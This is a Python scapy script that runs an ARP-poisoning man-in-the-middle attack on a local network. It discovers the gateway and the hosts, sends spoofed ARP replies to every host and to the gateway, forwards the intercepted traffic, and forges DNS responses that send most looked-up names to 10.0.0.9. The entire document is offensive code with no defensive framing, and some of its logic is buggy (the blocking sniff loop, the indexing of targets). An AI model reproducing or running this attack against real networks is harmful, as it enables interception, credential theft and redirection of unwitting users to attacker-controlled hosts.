from scapy.all import *
from scapy.layers.dns import DNSQR, DNSRR, DNS
from scapy.layers.inet import IP, ICMP, UDP
from scapy.layers.l2 import ARP, getmacbyip, Ether
import time
import netifaces
import threading


# op=2 means the flag 2 of arp that repleis to arp brodcast requests
class ARPPoison():

    def __init__(self):
        self.gateway = self.gateway_info()
        self.gateway_mac = ""
        self.My_Mac = get_if_hwaddr(conf.iface)
        self.targets = self.discover_net()
        self.subnet_mask = 0
        self.lock = threading.Lock()
        self.threads = []
        self.spoofing_active = False

    def gateway_info(self):
        gateways = netifaces.gateways()
        default_gateway = gateways.get(netifaces.AF_INET, [])

        if default_gateway:
            gateway_info = default_gateway[0]
            gateway_ip = gateway_info[0]
            interface_addresses = netifaces.interfaces()

            for interface in interface_addresses:
                interface_info = netifaces.ifaddresses(interface).get(netifaces.AF_INET, [])
                if interface_info:
                    subnet_mask = interface_info[0]['netmask']
                    break
            else:
                subnet_mask = None
        else:
            gateway_ip = None
            subnet_mask = None
        print(gateway_ip, subnet_mask)
        self.subnet_mask = subnet_mask
        return gateway_ip

    def discover_net(self):
        hosts = []
        try:
            # Convert subnet mask to CIDR notation
            subnet_prefix = sum(bin(int(bit)).count('1') for bit in self.subnet_mask.split('.'))
            ip_range = f"{self.gateway}/{subnet_prefix}"
            print(f"Scanning IP range: {ip_range}")

            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range)
            answered, unanswered = srp(arp_request, timeout=2, inter=0.1)
            for packet in answered:
                ip = packet[1].psrc
                mac = packet[1].hwsrc
                if ip != self.gateway:
                    hosts.append([ip, mac])
                else:
                    self.gateway_mac = mac
                print(f"IP: {ip} - MAC: {mac}")
        except ValueError as e:
            print(f"Error: {e}")
        targets = {ip: mac for ip, mac in hosts}
        print(targets)
        return targets

    def spoof(self, target_ip, target_mac, spoof_ip):
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(packet, verbose=False)

    def restore(self, destination_ip, destination_mac, source_ip, source_mac):
        packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        send(packet, verbose=False)

    def dns_filter(self, packet):
        # checks if the packet is a DNS packet with type "A" or type "PTR" dns_conditions
        cond = DNS in packet and packet[DNS].opcode == 0 and UDP in packet and packet[UDP].dport == 53
        if not cond:
            return False

        name = packet[DNSQR].qname.decode()
        excluded_websites = ["google", "ssl", "beacons", "widgetdata", "api"]
        qtype_conditions = [1, 12, 28]  # DNS query types to filter

        if packet[DNSQR].qtype in qtype_conditions and \
                not any(excluded_site in name for excluded_site in excluded_websites):
            return True
        else:
            return False

    def sniff_packets(self,target):
        while self.spoofing_active:
            sniff(count=1, lfilter=self.filter_check_packet, prn =self.change_packets)

    def filter_check_packet(self, packet):
        # Check if the packet has IP and Ethernet layers
        if IP not in packet or Ether not in packet:
            return False
        # Check if the destination MAC address matches the machine's MAC address
        if packet[Ether].dst != self.My_Mac:
            return False
        # Check if the packet is from the gateway and destined for a target IP
        if packet[Ether].src == self.gateway_mac and packet[IP].dst in self.targets:
            return True
        # Check if the packet is from a target IP
        if packet[IP].src in self.targets:
            return True
        # If none of the conditions are met, filter out the packet
        return False


    def change_packets(self, packet):
        try:
            if self.dns_filter(packet) == True:
                print("awfionawfa")
                print(f"dns!!! ----->>> {packet[DNSQR].qname}")
                udp_part = UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)
                dns_response = DNS(id=packet[DNS].id, qr=1, qd=packet[DNSQR],
                                  an=DNSRR(rrname=packet[DNSQR].qname, rdata="10.0.0.9", ttl=128))
                response_packet = Ether(dst=packet[Ether].src) / IP(dst=packet[IP].src,
                                                                      src=packet[IP].dst) / udp_part / dns_response
                print("b")
                send(response_packet)

            # forwards the packet
            elif packet[IP].src in self.targets:
                packet[Ether].dst = self.gateway_mac
                packet[Ether].src = self.My_Mac
                print("a")
                send(packet)
            elif packet[Ether].src == self.gateway_mac:
                packet[Ether].dst = self.targets[packet[IP].dst]
                packet[Ether].src = self.My_Mac
                print("a")
                send(packet)

        except Exception as e:
            raise (e)
            pass

    def start(self):
        for target in self.targets:
            thread = threading.Thread(target=self.poison_target, args=(target,))

            self.threads.append(thread)
            thread.start()

        try:
            while True:
                time.sleep(1.5)
        except KeyboardInterrupt:
            self.stop_poisoning()

    def poison_target(self, target):
        try:
            self.spoofing_active = True
            self.sniff_packets(target)
            while self.spoofing_active:
                with self.lock:
                    self.spoof(target[0], target[1], self.gateway)
                    self.spoof(self.gateway, self.gateway_mac, target[0])
                    time.sleep(1.5)
        except KeyboardInterrupt:
            self.restore(self.gateway, self.gateway_mac, target[0], target[1])
            self.restore(target[0], target[1], self.gateway, self.gateway_mac)


    def stop_poisoning(self):
        for thread in self.threads:
            thread.join()


if __name__ == '__main__':
    a = ARPPoison()
    a.start()
